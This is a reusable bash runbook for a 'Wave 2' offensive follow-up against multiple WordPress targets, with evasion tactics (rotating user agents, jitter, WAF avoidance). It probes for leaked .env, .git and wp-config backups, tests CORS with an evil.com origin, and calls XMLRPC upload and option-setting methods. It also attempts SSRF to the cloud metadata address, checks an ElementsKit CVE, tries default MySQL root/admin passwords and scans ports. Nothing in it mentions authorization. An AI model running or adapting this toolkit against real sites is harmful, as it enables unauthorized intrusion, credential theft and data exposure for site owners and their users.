# WordPress Deep Followup (Wave 2) — Multi-Target Probe Script

## Overview

Re-usable probe script for running a "Wave 2" deep followup pass across multiple WordPress targets. Chains from initial findings (CORS, XMLRPC, PHPInfo, plugins) into deeper exploitation attempts.

## Prerequisites

- `curl` with HTTPS support
- `python3` (for JSON parsing + complex regex — Alpine/BusyBox grep -P not available)
- `nc` / `timeout` (for port scanning and MySQL probe)

## OPSEC Constants

- Rate limit: 2-3s jitter between requests (`sleep $((2 + RANDOM % 3))`)
- User-Agent rotation: 4-5 modern browser UAs, randomly selected
- Back off: On 429/503, exponential backoff (5s, 10s, 20s, then abort target)
- Stop on 403: If sensitive path returns 403, WAF is active — switch path class
- crt.sh: Wait 10+ seconds between queries (aggressive rate limiting)

## Script Template

```bash
#!/bin/bash
# wp-deep-followup.sh — Wave 2 Deep Followup for a single WordPress target
# Usage: ./wp-deep-followup.sh target.com [output-dir]

TARGET="${1:-target.com}"
OUTDIR="${2:-/root/output/recon_us/deep}"
REPORT="$OUTDIR/${TARGET}_wave2.md"

# User-Agents
UA=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.5"
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126.0"
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"
)
get_ua() { echo "${UA[$((RANDOM % 4))]}"; }
sleep_jitter() { sleep $((2 + RANDOM % 3)); }

# Probe function: HTTP code + size for a path
probe() {
  local path="$1" label="$2"
  local ua=$(get_ua)
  local r=$(curl -sk -o /tmp/w2p -w "%{http_code}:%{size_download}" \
    -H "User-Agent: $ua" -H "Origin: https://evil.com" \
    "https://${TARGET}${path}" 2>/dev/null)
  local code=$(echo "$r" | cut -d: -f1)
  local size=$(echo "$r" | cut -d: -f2)
  if [ "$code" = "200" ] && [ "$size" -gt 0 ]; then
    echo "[$label] $path — HTTP $code (${size}B)"
    head -c 150 /tmp/w2p 2>/dev/null | tr -d '\0'
    echo
    return 0
  elif [ "$code" != "404" ] && [ "$code" != "000" ]; then
    echo "[$label] $path — HTTP $code (${size}B)"
    return 0
  fi
  return 1
}

# Write report header
{
  echo "# ${TARGET} — Wave 2 Deep Followup"
  echo "**Date**: $(date)"
  echo ""

  # Phase 1: Sensitive Paths
  echo "---"
  echo "## Phase 1: Sensitive Paths"
  echo '```'
  for p in \
    "/.env" "/.git/config" "/.git/HEAD" \
    "/wp-config.php.bak" "/wp-config.php~" "/wp-config.php.old" "/wp-config.txt" \
    "/storage/logs/laravel.log" "/backup.sql" "/dump.sql" \
    "/phpinfo.php" "/info.php" "/test.php" "/debug.php" \
    "/sitemap.xml" "/robots.txt" \
    "/wp-content/debug.log" "/wp-content/uploads/" \
    "/wp-json/" \
    "/wp-json/wp/v2/users" \
    "/wp-json/elementskit/v1/" \
    "/wp-json/rankmath/v1/" \
    "/wp-json/wp/v2/pages" \
    "/wp-json/wp/v2/posts" \
    "/author-sitemap.xml"; do
    sleep_jitter
    probe "$p" "Sensitive"
  done
  echo '```'

  # Phase 2: CORS Credential Matrix
  echo ""
  echo "---"
  echo "## Phase 2: CORS Credential Matrix"
  echo '```'
  for ep in \
    "/wp-json/wp/v2/users" "/wp-json/wp/v2/posts" "/wp-json/wp/v2/pages" \
    "/wp-json/wp/v2/media" "/wp-json/wp/v2/comments" "/wp-json/wp/v2/statuses" \
    "/wp-json/wp/v2/tags" "/wp-json/wp/v2/categories" "/wp-json/wp/v2/settings" \
    "/wp-json/wp-site-health/v1" \
    "/wp-json/wc/v3/products" "/wp-json/wc/v3/orders" "/wp-json/wc/v3/customers"; do
    sleep_jitter
    ch=$(curl -sk -I "https://${TARGET}${ep}" -H "User-Agent: $(get_ua)" \
      -H "Origin: https://evil.com" 2>/dev/null | grep -iE "access-control")
    hc=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}${ep}" \
      -H "User-Agent: $(get_ua)" -H "Origin: https://evil.com" 2>/dev/null)
    if echo "$ch" | grep -qi "Access-Control-Allow-Credentials: true"; then
      echo "  [CORS+] ${ep} — HTTP ${hc} — CREDENTIAL EXPLOITABLE"
    elif [ -n "$ch" ]; then
      echo "  [CORS?] ${ep} — HTTP ${hc} — $(echo $ch | tr '\n' ' ')"
    fi
  done
  echo '```'

  # Phase 3: XMLRPC Individual Method Testing
  echo ""
  echo "---"
  echo "## Phase 3: XMLRPC Method-by-Method"
  echo '```'
  for xml_path in "/xmlrpc.php" "/magical/xmlrpc.php" "/wp/xmlrpc.php"; do
    sleep_jitter
    xc=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}${xml_path}" \
      -H "User-Agent: $(get_ua)")
    [ "$xc" = "000" ] && continue
    echo "### XMLRPC: ${xml_path} — HTTP ${xc}"
    if [ "$xc" = "200" ] || [ "$xc" = "405" ]; then
      # Test via POST regardless of GET status
      for method in system.multicall wp.uploadFile metaWeblog.newMediaObject \
        pingback.ping wp.getUsers wp.getPosts wp.getOptions wp.setOptions; do
        sleep_jitter
        mr=$(curl -sk -X POST "https://${TARGET}${xml_path}" \
          -H "User-Agent: $(get_ua)" -H "Content-Type: text/xml" \
          -d "<?xml version=\"1.0\"?><methodCall><methodName>${method}</methodName></methodCall>" \
          2>/dev/null | python3 -c "
import sys, re
data = sys.stdin.read()
fc = re.search(r'faultCode[^0-9]*([0-9]+)', data)
if fc:
    print(f'faultCode {fc.group(1)}')
elif '<string>' in data:
    vals = re.findall(r'<string>([^<]+)</string>', data)
    print(f'OK - response: {\" \".join(vals[:3])}')
else:
    print('OK (no fault)')
" 2>/dev/null)
        echo "    ${method}: ${mr}"
      done
      # SSRF via pingback
      for ssrf_target in "http://169.254.169.254/" "http://127.0.0.1/" "http://localhost:80/"; do
        sleep_jitter
        sr=$(curl -sk -X POST "https://${TARGET}${xml_path}" \
          -H "User-Agent: $(get_ua)" -H "Content-Type: text/xml" \
          -d "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>${ssrf_target}</string></value></param><param><value><string>https://${TARGET}/</string></value></param></params></methodCall>" \
          2>/dev/null | python3 -c "
import sys, re
data = sys.stdin.read()
fc = re.search(r'faultCode[^0-9]*([0-9]+)', data)
print(f'faultCode {fc.group(1)}' if fc else 'OK (accepted)')
")
        echo "    SSRF ${ssrf_target}: ${sr}"
      done
    fi
  done
  echo '```'

  # Phase 4: Staging Environment Check
  echo ""
  echo "---"
  echo "## Phase 4: Staging Environment (/dev/staging)"
  echo '```'
  for sub_prefix in "staging" "dev" "stage" "test" "qa" "beta" "old"; do
    sleep_jitter
    sc=$(curl -sk -o /dev/null -w "%{http_code}" "https://${sub_prefix}.${TARGET}/" \
      -H "User-Agent: $(get_ua)" 2>/dev/null)
    [ "$sc" != "000" ] && [ "$sc" != "404" ] && echo "  ${sub_prefix}.${TARGET}: HTTP ${sc}"
  done
  echo '```'

  # Phase 5: JS Bundle + Secrets
  echo ""
  echo "---"
  echo "## Phase 5: JS Bundle Analysis"
  echo '```'
  mkdir -p /tmp/w2_js_${TARGET}
  curl -sk "https://${TARGET}/" -H "User-Agent: $(get_ua)" -o /tmp/w2_js_${TARGET}/homepage.html 2>/dev/null
  python3 -c "
import sys, re, os
html = open('/tmp/w2_js_${TARGET}/homepage.html').read()
# Find JS URLs
for m in re.finditer(r'src=\"([^\"]*\.js[^\"]*)\"', html):
    print(f'JS: {m.group(1)}')
# Find secrets in HTML
patterns = ['apiKey', 'api_key', 'secret', 'token', 'JWT', 'password',
            'firebase', 'supabase', 'aws_access_key', 'GCP',
            'admin_url', 'ajax_url']
for pattern in patterns:
    if pattern.lower() in html.lower():
        print(f'[!] Pattern found: {pattern}')
# Find internal IPs
for m in re.finditer(r'(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})', html):
    print(f'[!] Internal IP: {m.group()}')
" 2>/dev/null || echo "No secrets found"
  echo '```'

  # Phase 6: Subdomains via crt.sh
  echo ""
  echo "---"
  echo "## Phase 6: Subdomain Enumeration"
  echo '```'
  sleep 10
  crt_data=$(curl -sk "https://crt.sh/?q=%25.${TARGET}&output=json" \
    -H "User-Agent: $(get_ua)" 2>/dev/null)
  echo "$crt_data" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    subs = set()
    for e in d:
        for n in e.get('name_value', '').split('\n'):
            n = n.strip().lower()
            if n and '*' not in n:
                subs.add(n)
    for s in sorted(subs):
        print(f'  {s}')
    print(f'Total: {len(subs)}')
except Exception as e:
    print(f'crt.sh error: {e}')
" 2>/dev/null || echo "No subdomains"
  echo '```'

  echo ""
  echo "---"
  echo "## Summary"
  echo "Wave 2 deep followup completed for ${TARGET}."

} > "$REPORT"

echo "Report saved: $REPORT"
```

## Per-Target Specialization Templates

### ElementsKit (CVE-2023-6853)
```bash
# Test admin-ajax.php action registration
curl -sk "https://$TARGET/wp-admin/admin-ajax.php?action=elementskit_upload_file"
# HTTP 400 = action registered, needs params
# HTTP 200 = action succeeded (maybe already uploaded?)
# HTTP 404 = action not registered

# Check ElementsKit REST namespace
curl -sk "https://$TARGET/wp-json/elementskit/v1/"
# Check CORS on ElementsKit endpoints
curl -skI "https://$TARGET/wp-json/elementskit/v1/widget/mailchimp" \
  -H "Origin: https://evil.com"
```

### MyBB Forum
```bash
for path in "/forum/" "/board/" "/wineboard/" "/community/"; do
  # Check core endpoints
  for ep in "/" "/member.php?action=register" "/member.php?action=login" \
    "/stats.php" "/private.php" "/search.php" "/admin/" \
    "/inc/config.php" "/install/index.php"; do
    curl -sk -o /dev/null -w "%{http_code}:%{size_download}" "https://$TARGET${path}${ep}" \
      -H "User-Agent: $(get_ua)"
    sleep 2
  done
done
```

### MySQL Probes (Non-WordPress)
```bash
# Banner grab
echo "" | timeout 5 nc -w 3 $TARGET 3306 2>/dev/null | strings

# Test default credentials (if mysql client available)
mysql -h $TARGET -P 3306 -u root -proot -e "SELECT version();"
mysql -h $TARGET -P 3306 -u admin -padmin -e "SHOW DATABASES;"
```

### Port Scan Followup
```bash
for port in 3000 5000 8000 8080 8081 8082 8083 8084 8085 8443 8888 9000 9090 9200 5432 6379 27017; do
  timeout 2 bash -c "echo > /dev/tcp/$TARGET/$port" 2>/dev/null && echo "Port $port OPEN"
done
```

## Troubleshooting

- **`grep -P` fails**: Alpine/BusyBox doesn't support Perl regex. Use `python3 -c "import re; ..."` instead.
- **crt.sh returns JSON error**: The service may be rate-limited. Wait 10-15 seconds between queries, or use a different source.
- **All sensitive paths return 301**: The domain may redirect to a different hostname (e.g., non-WWW to WWW). Try both variants.
- **Staging subdomain resolves but returns different content**: The staging and production databases may differ — check both for users/CORS/disclosures.
